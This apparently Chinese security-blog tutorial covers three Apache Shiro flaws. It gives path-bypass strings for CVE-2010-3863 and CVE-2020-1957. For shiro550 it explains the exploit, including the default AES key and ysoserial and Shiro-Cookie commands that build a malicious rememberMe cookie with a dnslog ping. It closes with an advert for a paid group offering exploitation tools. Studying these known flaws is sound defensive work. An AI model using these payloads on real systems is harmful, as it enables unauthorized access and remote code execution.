#  一文了解往年热门的漏洞-shiro   
原创 CatalyzeSec  CatalyzeSec   2024-05-27 20:27  
  
什么是shiro  
  
**Apache Shiro**  
框架是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序——从最小的移动应用程序到最大的 Web 和企业应用程序。  
# CVE-2010-3863  
## 漏洞描述  
  
Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。在Apache Shiro 1.1.0以前的版本中，shiro 进行权限验证前未对url 做标准化处理，攻击者可以构造`/`、`//`、`/./`、`/../` 等绕过权限验证  
## 影响版本  
  
shiro < 1.1.0 和JSecurity 0.9.x  
## 漏洞利用  
  
测试页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibibu6kUxsXtRIyAgrSy9MvH7baudhqg8LeYqO0qKC2tYdhJcrXdvVtf5Q/640?wx_fmt=other&from=appmsg "")  
  
exp  
```
/./admin
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibibyceM7UYHxYq1ehKiciafJfCP2UTnAxhel7todPl67xDTZEibkw3DV8w6g/640?wx_fmt=other&from=appmsg "")  
  
可以成功绕过权限，访问登录后的页面  
  
CVE-2016-4437（shiro550）  
## 漏洞描述  
  
Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。  
  
shiro550是非常热门的漏洞之一，在往年hvv中是必打的漏洞之一，与之一起提起的就是shiro721（  
CVE-2019-12422），与550不同的是721需要登录后才能在cookie中进行修改值。  
## 漏洞原理  
  
Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户信息加密，加密过程:用户信息=>序列化=>AES加密=>base64编码=>RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本<=1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA==，这就更容易触发RCE漏洞。**所以我们Payload产生的过程：**  
  
命令=>序列化=>AES加密=>base64编码=>RememberMe Cookie值  
## 影响版本  
  
shiro <= 1.2.4  
## 漏洞利用  
  
测试页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibibI5lG08VY9q1FPch10oJHXaCFiaysOAvoRqohz9aQFlGO9HHmRzUD0Dg/640?wx_fmt=png&from=appmsg "")  
  
指纹识别：  
  
针对于shiro的特征就是在响应头字段中的 rememberMe=DeleteMe 字段  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibibqCE85XdfZYhU4ETTy2Is8Ke5eAT1HJwWcibN67db06UGDO2ux3Q8Z9Q/640?wx_fmt=png&from=appmsg "")  
  
利用工具shiro_attack.jar可以很方便的做shiro的检测  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibib3l1PXFzSYQX50Esbh6hHia58icQG4Y9JQJFxwNXjydARwcZCKN7LjtRg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibibmn0L5o1DyHicgerGeWJJz5ywtYTOqbib5FExrl0tQicKYXuExj06RR3Ew/640?wx_fmt=png&from=appmsg "")  
## 相关工具/脚本  
### 手工测试  
  
在确认密钥后利用 ysoserial 和 Shiro-Cookie 生成数据填充到 cookie 中来进行  
```
java -jar ysoserial-all.jar CommonsBeanutils1 "ping sfkzl1.dnslog.cn" > poc.ser
```  
```
java -jar Shiro-Cookie.jar  "poc.ser" "kPH+bIxk5D2deZiIxcaaaA=="
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibibBOv0Gk7dAxMibjnicNwk7j44V51wich3VgRDcwY28qA6wibnL7fmbYhyVw/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibibV3ERO1fwiaOUG7EFtbmSAic8WyQoXNJu5ATmzUQmw9I6WxRzxDcS2ftQ/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibibx9k0HEwEtib84S2VEUoTmo8E8mvpVs1piahWE74BcNgsypY5BNUDywFQ/640?wx_fmt=other&from=appmsg "")  
  
CVE-2020-1957  
## 漏洞描述  
  
在Apache Shiro 1.5.2以前的版本中，在使用Spring动态控制器时，攻击者通过构造`..;`这样的跳转，可以绕过Shiro中对目录的权限限制。  
## 影响版本  
  
Apache Shiro <= 1.5.2  
## 漏洞利用  
  
测试页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibib9KohrtmArGHX55ahmIcGobz7mkacE3fh7jAJWhAiak9XqoG0y6CWuYg/640?wx_fmt=png&from=appmsg "")  
  
exp  
```
/Catalyze/..;/admin/
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibibrVbxtqa3dTm3EUDGkFtPHJe1VL0NrG38V0icHtuTIiakzD5sMzGRFNCA/640?wx_fmt=other&from=appmsg "")  
  
关注**CatalyzeSec**公众号  
  
在后台回复 shiro 获取相关工具下载链接  
  
加入星球获取更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibibg5JaQPHLTrN0Foq7icnCP2HBKDTBnEw73DfZu2DVyNycj1TBcsvYGUw/640?wx_fmt=png&from=appmsg "")  
  
知识星球  
  
高质量安全知识星球社区，致力于漏洞挖掘，渗透技巧，安全资料，星球承诺会持续更新0/1/NDay及对应的批量利用工具，团队内部漏洞库，内外网攻防技巧，你所需要的各类安全工具和资料以及团队师傅们最新的学习研究成果。分享行业内最新动态，解答交流各类技术问题。  
  
涉及方向包括Web渗透、免杀绕过、红蓝攻防、代码审计、应急响应、安全培训、CTF、小白入门、职业规划和疑难解答。**CatalyzeSec**  
，安全技术水平的催化者，星球针对成员的技术问题，快速提供思考方向及解决方案，并为星友提供多种方向的学习资料、安全工具、POC&EXP以及各种学习笔记等，以引导者和催化剂的方式助力安全技术水平的提升。  
  
我们是一个快速成长的team，团队的发展方向与每一位星友的学习方向密切相关，加入我们，一起成为更好的自己！  
  
PS：随着星球内知识的积累，人员的增加，  
星球价格也会随之增加，前一百位加入我们的师傅可享受99元朋友价！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibib5qjeqj98fEtibZibYgDicqib35KiaYn0lGubL2En5bxQc83BCsLSNx70icdg/640?wx_fmt=jpeg&from=appmsg "")  
  
团队内部独家知识库  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykzmQxlJaEaj8S3Gvl1uMibibPZJAfVcrOG5kJXsUpa8AjgR9ALibgOofk6REOVY2oHTh0ib7gBNPKEOA/640?wx_fmt=png&from=appmsg "")  
  
  
